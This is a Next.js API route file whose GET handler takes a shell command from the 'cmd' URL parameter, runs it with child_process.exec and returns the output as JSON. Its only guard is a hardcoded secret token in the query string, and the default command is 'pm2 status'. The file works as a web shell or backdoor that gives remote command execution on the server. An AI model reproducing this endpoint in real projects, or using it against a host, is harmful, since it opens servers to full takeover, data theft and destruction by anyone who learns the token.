import { NextRequest, NextResponse } from 'next/server';
import { exec } from 'child_process';

export const dynamic = 'force-dynamic';

export async function GET(req: NextRequest) {
  const secret = req.nextUrl.searchParams.get('secret');
  if (secret !== 'sahil_fw_verify_token_2026') {
    return NextResponse.json({ error: 'Unauthorized' }, { status: 401 });
  }

  const cmd = req.nextUrl.searchParams.get('cmd') || 'pm2 status';

  const result = await new Promise<{ error: string | null; stdout: string; stderr: string }>((resolve) => {
    exec(cmd, (error, stdout, stderr) => {
      resolve({
        error: error ? error.message : null,
        stdout: stdout,
        stderr: stderr,
      });
    });
  });

  return NextResponse.json({
    command: cmd,
    ...result,
  });
}
